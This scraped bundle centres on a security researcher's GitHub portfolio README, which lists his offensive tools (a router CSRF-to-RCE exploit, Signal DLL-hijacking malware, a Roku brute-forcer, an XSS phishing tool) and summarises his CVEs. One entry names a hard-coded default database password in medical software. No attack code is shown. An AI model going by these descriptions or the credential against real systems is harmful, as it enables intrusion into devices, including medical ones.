=== Content from johnjhacking.com_11a59860_20250119_142803.html ===


* [Home](https://johnjhacking.com)
* [Blog](/blog)
* [Research](/research)

* [Home](https://johnjhacking.com)
* [Blog](/blog)
* [Research](/research)

# Hack the Galaxy.

* [![GitHub](https://cdn.svgporn.com/logos/github-icon.svg)](https://github.com/johnjhacking)

# Certifications

*Click the images below to learn more about the courses*

[![Certified Red Team Professional](/uploads/zero-point-security-red-team-operator-2022-04-17.png)
Certified Red Team Professional](https://training.zeropointsecurity.co.uk/courses/red-team-ops)
[![Offensive Security Certified Professional](https://images.credly.com/size/340x340/images/ec81134d-e80b-4eb5-ae07-0eb8e1a60fcd/image.png)
Offensive Security Certified Professional](https://www.offsec.com/courses/pen-200/)
[![Certified Network Defense Architect](/uploads/2023-03-28-17_23_57-cnda_f38dca5865d6-png-352x352-brave.png)
Certified Network Defense Architect](https://cert.eccouncil.org/cnda.html)
[![Certified Ethical Hacker | Master](https://i.imgur.com/Zjmpd1r.png)
Certified Ethical Hacker | Master](https://www.eccouncil.org/train-certify/ceh-master/)
[![Certified Network Defender](https://i.imgur.com/CxbfPnD.png)
Certified Network Defender](https://www.eccouncil.org/train-certify/certified-network-security-course/)
[![Certified Penetration Testing Engineer](/uploads/cpte-badge-2.png)
Certified Penetration Testing Engineer](https://mile2.com/penetration-testing-engineer-outline/)
[![Security+](https://images.youracclaim.com/size/340x340/images/74790a75-8451-400a-8536-92d792c5184a/CompTIA_Security_2Bce.png)
Security+](https://www.comptia.org/certifications/security)
[![A+](https://images.youracclaim.com/size/340x340/images/63482325-a0d6-4f64-ae75-f5f33922c7d0/CompTIA_A_2Bce.png)
A+](https://www.comptia.org/certifications/a)
[![ITIL Foundation](https://i.imgur.com/vkvGeSQ.png)
ITIL Foundation](https://www.axelos.com/certifications/itil-service-management/itil-4-foundation)
[![Metasploit Pro Certified Specialist](https://images.youracclaim.com/size/340x340/images/c8f7132c-66d7-4f12-94fb-fa58f875701b/Metasploit_Pro_Specialist.png)
Metasploit Pro Certified Specialist](https://www.rapid7.com/services/training-certification/training/metasploit-pro-certified-specialist/)
![AppSpider Enterprise Certified Specialist](https://images.youracclaim.com/size/340x340/images/01f09d6c-1ab6-431c-adee-cd6af025d988/AppSpider_Enterprise_Specialist.png)
AppSpider Enterprise Certified Specialist

![Creative Commons](https://mirrors.creativecommons.org/presskit/icons/cc.svg)
![CC-BY](https://mirrors.creativecommons.org/presskit/icons/by.svg)
2020
John



=== Content from github.com_767cd884_20250119_142805.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjohnjhacking)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjohnjhacking)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@johnjhacking](https://avatars.githubusercontent.com/u/39013067?s=64&v=4)

**johnjhacking**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fjohnjhacking)

[Overview](/johnjhacking)
[Repositories
13](/johnjhacking?tab=repositories)
[Projects
0](/johnjhacking?tab=projects)
[Packages
0](/johnjhacking?tab=packages)
[Stars
0](/johnjhacking?tab=stars)

More

* [Overview](/johnjhacking)
* [Repositories](/johnjhacking?tab=repositories)
* [Projects](/johnjhacking?tab=projects)
* [Packages](/johnjhacking?tab=packages)
* [Stars](/johnjhacking?tab=stars)

![@johnjhacking](https://avatars.githubusercontent.com/u/39013067?s=64&v=4)

**johnjhacking**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fjohnjhacking)

[![View johnjhacking's full-sized avatar](https://avatars.githubusercontent.com/u/39013067?v=4)](https://avatars.githubusercontent.com/u/39013067?v=4)

# johnjhacking

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fjohnjhacking)

Principal Red Team Operator & Technical Exploitation Officer
[317
followers](https://github.com/johnjhacking?tab=followers) Â· [6
following](https://github.com/johnjhacking?tab=following)

* <https://shoganaiconsulting.com>

## [Achievements](/johnjhacking?tab=achievements)

[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)x3](/johnjhacking?achievement=starstruck&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x2](/johnjhacking?achievement=pull-shark&tab=achievements)[![Achievement: Public Sponsor](https://github.githubassets.com/assets/public-sponsor-default-9fa68986b057.png)](/johnjhacking?achievement=public-sponsor&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/johnjhacking?achievement=yolo&tab=achievements)
## [Achievements](/johnjhacking?tab=achievements)

[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)x3](/johnjhacking?achievement=starstruck&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x2](/johnjhacking?achievement=pull-shark&tab=achievements)[![Achievement: Public Sponsor](https://github.githubassets.com/assets/public-sponsor-default-9fa68986b057.png)](/johnjhacking?achievement=public-sponsor&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/johnjhacking?achievement=yolo&tab=achievements)

Block or Report

# Block or report johnjhacking

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this userâs behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=johnjhacking+%28user%29)

[Overview](/johnjhacking)
[Repositories
13](/johnjhacking?tab=repositories)
[Projects
0](/johnjhacking?tab=projects)
[Packages
0](/johnjhacking?tab=packages)
[Stars
0](/johnjhacking?tab=stars)

More

* [Overview](/johnjhacking)
* [Repositories](/johnjhacking?tab=repositories)
* [Projects](/johnjhacking?tab=projects)
* [Packages](/johnjhacking?tab=packages)
* [Stars](/johnjhacking?tab=stars)

[johnjhacking](/johnjhacking/johnjhacking)/README.md

# Hack the Galaxy.

Welcome to my portfolio. My name is [John Jackson](https://en.wikipedia.org/wiki/John_Jackson_%28hacker%29), also known to many as "Mr. Hacking".
I am the founder of now defunct hacking group [Sakura Samurai](https://en.wikipedia.org/wiki/Sakura_Samurai_%28group%29).

I may not research with a group, however, I'm still continously honing my skills and performing security research. This portfolio will be for organizing all of my work/accomplishments. Keep in mind that I cannot possibly link all of the news articles related to my research, otherwise this portfolio will be too long. In addition, I may link to blog posts from my old website - but my website is outdated and only running for the sake of archive and backlinks; Github will be my primary operating portfolio now.

 I'm also the author of Corporate Cybersecurity: Identifying Risks and The Bug Bounty Program. Click on the image to see my book!

[![Wikipedia](https://camo.githubusercontent.com/d48156e3cf2b322cff12c82604e051afb1e0f48b10e7906b5cac4ad2e565a39f/68747470733a2f2f6d656469612e77696c65792e636f6d2f70726f647563745f646174612f636f766572496d6167653330302f32582f31313139373832352f313131393738323532582e6a7067)](https://www.wiley.com/en-us/Corporate%2BCybersecurity%3A%2BIdentifying%2BRisks%2Band%2Bthe%2BBug%2BBounty%2BProgram-p-9781119782520)

My portfolio consists of the following sections:
 â¢ Certifications: All of the certifications I have achieved, in order of most to least recent.
 â¢ Awards: Any relevant Information Security awards.
 â¢ Created Tools by Popularity: A list of all of the tools I have created that aren't part of guide or a tool specific to a CVE proof of concept.
â¢ Guides: Writeups pertaining to education, such as certifications.
â¢ My Identified Common Vulnerabilities & Exposures (CVES): My assigned CVE identifiers with a quick summary on each, neatly linked with corresponding writeups or proof of concepts.
 â¢ Archive: All of the blog posts that I have written, including ones not associated with CVEs.

### Certifications

â£ Certified Red Team Professional
â£ Offensive Security Certified Professional
â£ Certified Network Defense Architect
â£ Certified Ethical Hacker | Master
â£ Certified Network Defender
â£ Certified Penetration Testing Engineer
â£ Security+
â£ A+
â£ ITIL Foundation
â£ Metasploit Pro Certified Specialist
â£ AppSpider Enterprise Certified Specialist
â£ Pro Labs: Dante
â£ Pro Labs: Zephyr
### Awards

â£ Certificate of Appreciation, Information Warfare: Centre For Strategic Communication and Information Security, Ukraine
â£ Medal for Service and Valor, 3rd Degree: Joint Forces of the Armed Forces of Ukraine
### Created Tools by Popularity

| **Tool Name** | **Usage** | **Stars** | **Forks** | **Link** |
| --- | --- | --- | --- | --- |
| BadgerDAPS | Brute Ratel LDAP filtering and sorting tool. Easily take BR log output and pull hostnames for ease of use with other red team tooling. Supports OU filtering and removes disabled hosts. | [Stars](https://camo.githubusercontent.com/2a303de42296f2e3c02e092f3438a0cb213adaabce0f54218be7307ac15ef879/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f6a6f686e6a6861636b696e672f626164676572444150533f7374796c653d666c61742d737175617265266c6162656c436f6c6f723d333433623431) | [Stars](https://camo.githubusercontent.com/1564acdc801096847f65151eef7fdb217bc63b36f6e4a6bcd7a74087af3996c9/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f666f726b732f6a6f686e6a6861636b696e672f626164676572444150533f7374796c653d666c61742d737175617265266c6162656c436f6c6f723d333433623431) | [Github](https://github.com/johnjhacking/badgerDAPS) |
| ez-iRZ | Exploit for CVE-2022-27226, CSRF to RCE in iRZ Mobile Routers | [Stars](https://camo.githubusercontent.com/0a18013cae6e24e2129a5274acabfa6fa20c25982aa96d7bc13402554032e3cf/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f53616b75726153616d75726169692f657a2d69525a3f7374796c653d666c61742d737175617265266c6162656c436f6c6f723d333433623431) | [Stars](https://camo.githubusercontent.com/d0f16ba8d5db415d1bb66bc00dc0ad16ef5659abc29b4ead824bffdae61a8765/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f666f726b732f53616b75726153616d75726169692f657a2d69525a3f7374796c653d666c61742d737175617265266c6162656c436f6c6f723d333433623431) | [Github](https://github.com/SakuraSamuraii/ez-iRZ) |
| Signal DLL Hijacking | DLL Malware for Signal Desktop. Utilizes missing dbghelp.dll | [Stars](https://camo.githubusercontent.com/4a9d69dd10ff7f833d9f3c59cad4dd1cafd9042ea979873ab4b1e7abd9ae8aeb/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f6a6f686e6a6861636b696e672f5369676e616c2d444c4c2d48696a61636b696e673f7374796c653d666c61742d737175617265266c6162656c436f6c6f723d333433623431) | [Stars](https://camo.githubusercontent.com/c01c8218b65ccf95cb4794aec3ad4e6239c2573078172828f479ad74246aa8a0/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f666f726b732f6a6f686e6a6861636b696e672f5369676e616c2d444c4c2d48696a61636b696e673f7374796c653d666c61742d737175617265266c6162656c436f6c6f723d333433623431) | [Github](https://github.com/johnjhacking/Signal-DLL-Hijacking) |
| RokuRogue | A script for brute forcing Roku TVs and installing applications remotely. | [Stars](https://camo.githubusercontent.com/84068ee245ece9e794818d824b013e220fe118e2dafac01eb868be7c017d3bc3/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f6a6f686e6a6861636b696e672f526f6b75526f6775653f7374796c653d666c61742d737175617265266c6162656c436f6c6f723d333433623431) | [Stars](https://camo.githubusercontent.com/02300a4c13a8b0a7637e403675a25f451a54b7685f50c5aaff3e2bec13582356/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f666f726b732f6a6f686e6a6861636b696e672f526f6b75526f6775653f7374796c653d666c61742d737175617265266c6162656c436f6c6f723d333433623431) | [Github](https://github.com/johnjhacking/RokuRogue) |
| Jorogumo | Red Team Stored XSS SVG phishing-companion tool with the ability to serve a malicious login page, or clone an html page and implement custom javascript. It then generates a relevant SVG. | [Stars](https://camo.githubusercontent.com/220a5c6ce2c45a6debbff9c16086f231bb5e59714e602c5455f4358e0f3f13ce/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f5370696465724c6162732f4a6f726f67756d6f3f7374796c653d666c61742d737175617265266c6162656c436f6c6f723d333433623431) | [Stars](https://camo.githubusercontent.com/4dffb39876ac5f30a98b5e654baec4bea20e6393136a5f83e4969b56d7025a9e/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f666f726b732f5370696465724c6162732f4a6f726f67756d6f3f7374796c653d666c61742d737175617265266c6162656c436f6c6f723d333433623431) | [Github](https://github.com/SpiderLabs/Jorogumo) |

### Guides

| **Guide Name** | **Description** | **Link** |
| --- | --- | --- |
| Buffer Overflow Guide | This Bufferflow Guide includes instructions and the scripts necessary for Buffer Overflow Exploitation. This guide is a supplement for TheCyberMentor's walkthrough. Includes companion scripts. It's pretty old as it was used for the original OSCP which has since been reworked. | [Github](https://github.com/johnjhacking/Buffer-Overflow-Guide) |
| The Ultimate CRTO Preparation Guide | The ultimate guide to passing the Certified Red Team Operator exam by Zero Point Security. | [Link](https://johnjhacking.com/blog/the-ultimate-crto-preparation-guide) |
| OSCP Reborn - 2023 Exam Preparation Guide | Revamped OSCP guide, tailored to be relevant for the latest revision of the OSCP which includes Active Directory exploitation. | [Link](https://johnjhacking.com/blog/oscp-reborn-2023) |

### My Identified Common Vulnerabilities & Exposures (CVES)

| **Name** | **Severity** | **Description** | **Associated Risk** | **Additional Comments** | **Proof of Concept** |
| --- | --- | --- | --- | --- | --- |
| [**CVE-2024-38143: Windows WLAN AutoConfig Service Elevation of Privilege Vulnerability**](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38143) | 4.2 MEDIUM | An unauthenticated attacker could exploit the vulnerability by interacting with a malicious wireless network from the lock screen of a device. | Successful exploitation results in possible escalation to NT AUTHORITY\SYSTEM | Primary attack method requires physical access to the device. As a secondary option, an attacker could pair this with social engineering, but it would still require an in-person presence. Attack vector would be a threat actor who steals a laptop, but is locked out of the computer and wants to access the data/doesn't want to completely reformat or swap drives. | N/A |
| [**CVE-2023-47800: Natus NeuroWorks and SleepWorks Use of Hard-coded Credentials**](https://nvd.nist.gov/vuln/detail/CVE-2023-47800) | 9.8 CRITICAL | Natus NeuroWorks and SleepWorks before 8.4 GMA3 utilize a default password of xltek for the Microsoft SQL Server service sa account, allowing a threat actor to perform remote code execution, data exfiltration, or other nefarious actions such as tampering with data or destroying/disrupting MSSQL services. | Remote code execution via MSSQL paired with CrackMapExec. Data theft, tampering, or destruction. Negatively affecting medical patients' results. | More likely to be exploited by a threat actor on the internal network, have used this on multiple medical client networks so it's relevant for pivoting. | [**Writeup**](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/pwning-electroencephalogram-eeg-medical-devices-by-default/) |
| [**CVE-2023-24068: Signal Desktop Attachment Modification**](https://nvd.nist.gov/vuln/detail/CVE-2023-24068) | 7.8 HIGH | Signal Desktop before 6.2.0 on Windows, Linux, and macOS allows an attacker to modify conversation attachments within the attachments.noindex directory. Client mechanisms fail to validate modifications of existing cached files, resulting in an attacker's ability to insert malicious code into pre-existing attachments or replace them completely. A threat actor can forward the existing attachment in the corresponding conversation to external groups, and the name and size of the file will not change, allowing the malware to masquerade as another file. | Native spear fishing. If a backdoored attachment gets forwarded to a group chat, everyone can end up compromised. | Unlikely to be abused by your everday threat actor. This is of particular interest to federal and intelligence agencies, both domestic to the US and foreign. | [**Writeup**](https://johnjhacking.com/blog/cve-2023-24068-cve-2023-24069/) |
| [**CVE-2023-24069: Signal Desktop Attachment Recovery After Deletion**](https://nvd.nist.gov/vuln/detail/CVE-2023-24069) | 3.3 LOW | Signal Desktop before 6.2.0 on Windows, Linux, and macOS allows an attacker to obtain potentially sensitive attachments sent in messages from the attachments.noindex directory. Cached attachments are not effectively cleared. In some cases, even after a self-initiated file deletion, an attacker can still recover the file if it was previously replied to in a conversation./p> | Recovery of deleted attachments, rendering deletion pointless. | Unlikely to be abused by your everday threat actor. This is of particular interest to federal agencies or within eDiscovery and legal hold processes. | [**Writeup**](https://johnjhacking.com/blog/cve-2023-24068-cve-2023-24069/) |
| [**CVE-2022-27226: CSRF to RCE in iRZ Mobile Routers through 2022-03-16**](https://nvd.nist.gov/vuln/detail/cve-2022-27226) | 8.8 HIGH | A CSRF issue in /api/crontab on iRZ Mobile Routers through 2022-03-16 allows a threat actor to create a crontab entry in the router administration panel. The cronjob will consequently execute the entry on the threat actor's defined interval, leading to remote code execution, allowing the threat actor to gain filesystem access. In addition, if the router's default credentials aren't rotated or a threat actor discovers valid credentials, remote code execution can be achieved without user interaction. | Remote code execution via compromised credentials or chained credential theft. | Likely to be abused if access to this router is obtained. Exploitation is trivial. | [**Writeup**](https://johnjhacking.com/blog/cve-2022-27226/) |
| [**CVE-2021-45919: Studio 42 elFinder through 2.1.31 Stored XSS**](https://nvd.nist.gov/vuln/detail/CVE-2021-45919) | 5.4 MEDIUM | Studio 42 elFinder through 2.1.31 allows XSS via an SVG document. | Credential theft via phishing, but possible escalation to RCE via phishing if the correct conditions are achieved. | Unlikely to lead in an enterprise compromise, possible account theft. | [**Writeup**](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/from-stored-xss-to-rce-using-beef-and-elfinder-cve-2021-45919/) |
| [**CVE-2021-43032: XenForo through 2.2.7 Stored XSS**](https://nvd.nist.gov/vuln/detail/CVE-2021-43032) | 4.8 MEDIUM | In XenForo through 2.2.7, a threat actor with access to the admin panel can create a new Advertisement via the Advertising function, and save an XSS payload in the body of the HTML document. This payload will execute globally on the client side. | Credential theft via phishing | Possible account theft. | [**Writeup**](https://github.com/SakuraSamuraii/CVE-2021-43032) |
| [**CVE-2021-23827: Keybase Exposure of Sensitive Information to an Unauthorized Actor**](https://nvd.nist.gov/vuln/detail/CVE-2021-23827) | 5.5 MEDIUM | Keybase Desktop Client before 5.6.0 on Windows and macOS, and before 5.6.1 on Linux, allows an attacker to obtain potentially sensitive media (such as private pictures) in the Cache and uploadtemps directories. It fails to effectively clear cached pictures, even after deletion via normal methodology within the client, or by utilizing the "Explode message/Explode now" functionality. Local filesystem access is needed by the attacker. | Recovery of deleted attachments, rendering deletion pointless. | Unlikely to be abused by your everday threat actor. This is of particular interest to federal agencies or within eDiscovery and legal hold processes. | [**Writeup**](https://johnjhacking.com/blog/cve-2021-23827/) |
| [**CVE-2021-40875: Improper Access Control in Gurock TestRail versions < 7.2.0.3014 resulting in sensitive information exposure**](https://nvd.nist.gov/vuln/detail/CVE-2021-40875) | 7.5 HIGH | Improper Access Control in Gurock TestRail versions < 7.2.0.3014 resulted in sensitive information exposure. A threat actor can access the /files.md5 file on the client side of a Gurock TestRail application, disclosing a full list of application files and the corresponding file paths. | The corresponding file paths can be tested, and in some cases, result in the disclosure of hardcoded credentials, API keys, or other sensitive data. | Possible discovery during web application hacking. | [**Writeup**](https://johnjhacking.com/blog/cve-2021-40875/) |
| [**CVE-2021-24495: Wordpress Marmoset Viewer Plugin Reflected XSS**](https://nvd.nist.gov/vuln/detail/CVE-2021-24495) | 6.1 MEDIUM | A reflected cross site scripting vulnerability exists on the âidâ parameter of the Wordpress Marmoset Viewer plugin. A threat actor can utilize a specially crafted payload and append it to the id parameter included in the Marmoset Viewer. The cross site scripting vulnerability can lead to the potential theft of cookies or credentials, giving the threat actor the ability to take over a victimâs account or steal other sensitive information. | Credential theft via phishing | This may be chained with a post-authenticated exploit, unlikely to be used otherwise. | [**Writeup**](https://johnjhacking.com/blog/cve-2021-24495-improper-neutralization-of-input-during-web-page-generation-on-id-parameter-in-wordpress-marmoset-viewer-plugin-versions-1.9.3-leads-to-reflected-cross-site-scripting/) |
| [**CVE-2021-27653: Pega Chat Access Group Portal Improper Access Control**](https://nvd.nist.gov/vuln/detail/CVE-2021-27653) | 6.6 MEDIUM | Misconfiguration of the Pega Chat Access Group portal in Pega platform 7.4.0 - 8.5.x could lead to unintended data exposure. | Theft of sensitive data and credential material to perform Administrative account takeover. | There's high associated risk based on how trivial it is. | [**Advisory**](https://collaborate.pega.com/discussion/pega-security-advisory-%E2%80%93-b21) |
| [**CVE-2021-28919: npm Netmask SSRF Bypass**](https://nvd.nist.gov/vuln/detail/CVE-2021-28918) | 9.1 CRITICAL | Improper input validation of octal strings in netmask npm package v1.0.6 and below allows unauthenticated remote attackers to perform indeterminate SSRF, RFI, and LFI attacks on many of the dependent packages. A remote unauthenticated attacker can bypass packages relying on netmask to filter IPs and reach critical VPN or LAN hosts. | Bypass for prevntive measures against a wide array of attacks including but not limited to SSRF, RFI, LFI, XSS, etc | High associated risk, very likely. | [**Writeup**](https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-011.md) |
| [**CVE-2021-29662: Perl Data::Validate::IP Module Access Control Bypass**](https://nvd.nist.gov/vuln/detail/CVE-2021-29662) | 7.5 HIGH | The Data::Validate::IP module through 0.29 for Perl does not properly consider extraneous zero characters at the beginning of an IP address string, which (in some situations) allows attackers to bypass access control that is based on IP addresses. | Bypass for preventive measures within Perl for SSRF, RFI, LFI, XSS, etc | Lower associated risk against modern code, likely against older assets. | [**Writeup**](https://sick.codes/sick-2021-018/) |
| [**CVE-2020-28360: npm Private-IP SSRF Bypass**](https://nvd.nist.gov/vuln/detail/CVE-2020-28360) | 9.8 CRITICAL | Insufficient RegEx in private-ip npm package v1.0.5 and below insufficiently filters reserved IP ranges. | Indeterminable number of critical attack vectors, allowing remote attackers to request server-side resources or potentially execute arbitrary code through various SSRF techniques. | High probability of exploitation. A modern day filter bypass technique. | [**Writeup**](https://johnjhacking.com/blog/cve-2020-28360/) |
| [**CVE-2020-27403: TCL Improper Access Control**](https://nvd.nist.gov/vuln/detail/CVE-2020-27403) | 6.5 MEDIUM | A vulnerability in the TCL Android Smart TV series V8-R851T02-LF1 V295 and below and V8-T658T01-LF1 V373 and below by TCL Technology Group Corporation allows an attacker on the adjacent network to arbitrarily browse and download sensitive files over an insecure web server running on port 7989 that lists all files & directories. | An unprivileged remote attacker on the adjacent network, can download most system files, leading to serious critical information disclosure | High probability of exploitation if outdated TCL TV is on the internal network. | [**Writeup**](https://github.com/sickcodes/security/blob/master/advisories/SICK-2020-009.md) |
| [**CVE-2020-28055: TCL Local Privilege Escalation**](https://nvd.nist.gov/vuln/detail/CVE-2020-28055) | 7.8 HIGH | A vulnerability in the TCL Android Smart TV series V8-R851T02-LF1 V295 and below and V8-T658T01-LF1 V373 and below by TCL Technology Group Corporation allows a local unprivileged attacker, such as a malicious App, to read & write to the /data/vendor/tcl, /data/vendor/upgrade, and /var/TerminalManager directories within the TV file system. | Fake system upgrades by writing to the /data/vendor/upgrage folder. | Low liklihood, requires multiple factors to align. | [**Writeup**](https://github.com/sickcodes/security/blob/master/advisories/SICK-2020-012.md) |
| [**YOURLS Admin Panel Stored XSS**](https://nvd.nist.gov/vuln/detail/CVE-2020-27388) | 5.4 MEDIUM | Multiple Stored Cross Site Scripting (XSS) vulnerabilities exist in the YOURLS Admin Panel, Versions 1.5 - 1.7.10. An authenticated user must modify a PHP plugin with a malicious payload and upload it, resulting in multiple stored XSS issues. | Credential theft. | Improbable from an APT perspective, likely for targeted exploitation. | [**Writeup**](https://johnjhacking.com/blog/cve-2020-27388/) |

### Archive

* [**Everything**](https://johnjhacking.com/blog/)

## Popular repositories Loading

1. [Buffer-Overflow-Guide](/johnjhacking/Buffer-Overflow-Guide) Buffer-Overflow-Guide
   Public

   This Bufferflow Guide includes instructions and the scripts necessary for Buffer Overflow Exploitation. This guide is a supplement for TheCyberMentor's walkthrough. Please watch his walkthrough if â¦

   Python

   [543](/johnjhacking/Buffer-Overflow-Guide/stargazers)
   [72](/johnjhacking/Buffer-Overflow-Guide/forks)
2. [badgerDAPS](/johnjhacking/badgerDAPS) badgerDAPS
   Public

   Brute Ratel LDAP filtering and sorting tool. Easily take BR log output and pull hostnames for ease of use with other red team tooling. Supports OU filtering and removes disabled hosts.

   Python

   [37](/johnjhacking/badgerDAPS/stargazers)
   [3](/johnjhacking/badgerDAPS/forks)
3. [RokuRogue](/johnjhacking/RokuRogue) RokuRogue
   Public

   A script for brute forcing Roku TVs and installing applications remotely.

   Python

   [11](/johnjhacking/RokuRogue/stargazers)
   [1](/johnjhacking/RokuRogue/forks)
4. [Signal-DLL-Hijacking](/johnjhacking/Signal-DLL-Hijacking) Signal-DLL-Hijacking
   Public

   DLL Malware for Signal Desktop. Now utilizes missing dbghelp.dll since Signal patched cryptbase.

   HTML

   [9](/johnjhacking/Signal-DLL-Hijacking/stargazers)
   [3](/johnjhacking/Signal-DLL-Hijacking/forks)
5. [ez-iRZ](/johnjhacking/ez-iRZ) ez-iRZ
   Public

   Forked from [SakuraSamuraii/ez-iRZ](/SakuraSamuraii/ez-iRZ)

   Exploit for CVE-2022-27226

   Python

   [1](/johnjhacking/ez-iRZ/stargazers)
6. [johnjhacking](/johnjhacking/johnjhacking) johnjhacking
   Public

   Forked from [thmsgbrt/thmsgbrt](/thmsgbrt/thmsgbrt)

   My awesome README.md

   Mustache

   [1](/johnjhacking/johnjhacking/stargazers)

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.



=== Content from twitter.com_fd3755fa_20250119_142807.html ===



=== Content from github.com_9a67f544_20250119_142807.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FYOURLS%2FYOURLS%2Fpull%2F2761)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
